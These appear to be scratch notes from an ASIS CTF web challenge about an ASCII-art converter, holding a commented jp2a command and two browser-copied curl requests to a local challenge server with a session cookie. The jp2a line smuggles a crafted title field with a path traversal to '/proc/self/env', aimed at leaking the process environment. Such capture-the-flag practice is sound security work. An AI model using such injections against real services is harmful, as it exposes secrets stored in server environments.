# jp2a https://images.all-free-download.com/images/graphiclarge/animal_pictures_08_hd_picture_168987.jpg --html --output=./request/a.txt --html-title="a|session_id|../../../../../proc/self/env|hello

curl -v 'http://localhost:9000/request' \
  -H 'Connection: keep-alive' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: */*' \
  -H 'Origin: http://asciiart.asisctf.com:9000' \
  -H 'Referer: http://asciiart.asisctf.com:9000/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: connect.sid=s%3AOu5HKTQj8jG7jeXLq6I4G4gB5mVcUtl_.0orzZVlhvPgLmrIOl%2BxLsoomn0SL0MjzOKJEa2LYKoo' \
  --data-raw '{"url":["https://images.all-free-download.com/images/graphiclarge/animal_pictures_08_hd_picture_168987.jpg"]}' \
  --compressed \
  --insecure

curl 'http://localhost:9000/request/9ihGXrDwGfJvQI5DeO319XFhMnsnICv3' \
  -H 'Connection: keep-alive' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36' \
  -H 'Accept: */*' \
  -H 'Referer: http://asciiart.asisctf.com:9000/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: connect.sid=s%3AOu5HKTQj8jG7jeXLq6I4G4gB5mVcUtl_.0orzZVlhvPgLmrIOl%2BxLsoomn0SL0MjzOKJEa2LYKoo' \
  --compressed \
  --insecure